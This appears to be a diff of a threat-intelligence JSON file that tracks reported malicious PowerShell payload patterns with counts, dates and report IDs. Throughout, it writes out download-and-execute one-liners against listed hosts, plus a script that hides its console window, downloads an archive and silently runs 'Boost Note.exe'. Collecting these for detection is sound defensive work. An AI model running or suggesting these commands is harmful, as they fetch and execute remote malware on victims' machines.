@@ -246,15 +246,11 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 117,
-    "ReportCount": 117,
-    "FirstSeen": "2026-11-17T10:10:09.560000+00:00",
+    "DistinctPayloadCount": 113,
+    "ReportCount": 113,
+    "FirstSeen": "2026-11-17T14:55:43.108000+00:00",
     "LastSeen": "2026-11-22T12:29:08.297000+00:00",
     "ReportIds": [
-      "cmwkj71lv1epp0oml2z0a012c",
-      "cmwkjd2jz1eum0omljaktuag7",
-      "cmwkjm84z1f0v0omlbp0to0sq",
-      "cmwkjnyfa1f270oml6e7m8b2g",
       "cmwkte9y71fs10omlyn3mr6rc",
       "cmwkwnzbj1gia0oml0nx35ejg",
       "cmwkwqmbs1glr0omlra35kmei",
@@ -426,12 +422,10 @@
       "irm 'browse-cloud.codes/a8c0c6760a752b5e'|iex;",
       "irm 'browse-cloud.codes/aa14feca329c84db'|iex;",
       "irm 'browse-cloud.codes/aa38ccc1a99c84b8'|iex;",
-      "irm 'browse-cloud.codes/ab04965325b47811'|iex;",
       "irm 'browse-cloud.codes/ae1dab8b6cf00daf'|iex;",
       "irm 'browse-cloud.codes/afdfb04a77fe289e'|iex;",
       "irm 'browse-cloud.codes/b53c663a16af799f'|iex;",
       "irm 'browse-cloud.codes/b703dcf1ccd9e5c8'|iex;",
-      "irm 'browse-cloud.codes/b8fa79f96bd03ac8'|iex;",
       "irm 'browse-cloud.codes/b98e53a03eab894a'|iex;",
       "irm 'browse-cloud.codes/c213016b77263b96'|iex;",
       "irm 'browse-cloud.codes/c27615610ccab1da'|iex;",
@@ -457,12 +451,10 @@
       "irm 'browse-cloud.codes/e7debd0a277bf7d4'|iex;",
       "irm 'browse-cloud.codes/ebf9da4f21143943'|iex;",
       "irm 'browse-cloud.codes/ede3d0971a4d2345'|iex;",
-      "irm 'browse-cloud.codes/edef8da137f56aad'|iex;",
       "irm 'browse-cloud.codes/f1365b17cca3ee21'|iex;",
       "irm 'browse-cloud.codes/f1d9f3c6a9db3b63'|iex;",
       "irm 'browse-cloud.codes/f575605f2cabbf3b'|iex;",
       "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
-      "irm 'browse-cloud.codes/f787aa2bee9432bb'|iex;",
       "irm 'browse-cloud.codes/f8d105660261b6d8'|iex;",
       "irm 'browse-cloud.codes/fe3d91f20708755d'|iex;",
       "irm 'browse-cloud.codes/fef4413d3abac8e0'|iex;",
@@ -768,11 +760,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 12,
-    "FirstSeen": "2026-11-17T10:13:11.052000+00:00",
+    "ReportCount": 11,
+    "FirstSeen": "2026-11-18T05:10:55.738000+00:00",
     "LastSeen": "2026-11-20T17:27:10.495000+00:00",
     "ReportIds": [
-      "cmwkjaxor1erj0omlu3i5ekvr",
       "cmwlny3101nfu0omlp5zxyi3o",
       "cmwlqt2lp1qjq0omlqi37wlx9",
       "cmwlwqf991qtd0omluedqwsp1",
@@ -1002,19 +993,6 @@
     ],
     "PayloadExamples": [
       "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://simpludelicios[.]md/vcapcha.ps1'))\""
-    ]
-  },
-  {
-    "Pattern": "sal a iex;irm <URL>|a",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-17T10:09:31.888000+00:00",
-    "LastSeen": "2026-11-17T10:09:31.888000+00:00",
-    "ReportIds": [
-      "cmwkj68iz1ep40omlm1jzy3cm"
-    ],
-    "PayloadExamples": [
-      "sal a iex;irm quickrun31.cc/fu1kzzs|a"
     ]
   }
 ]
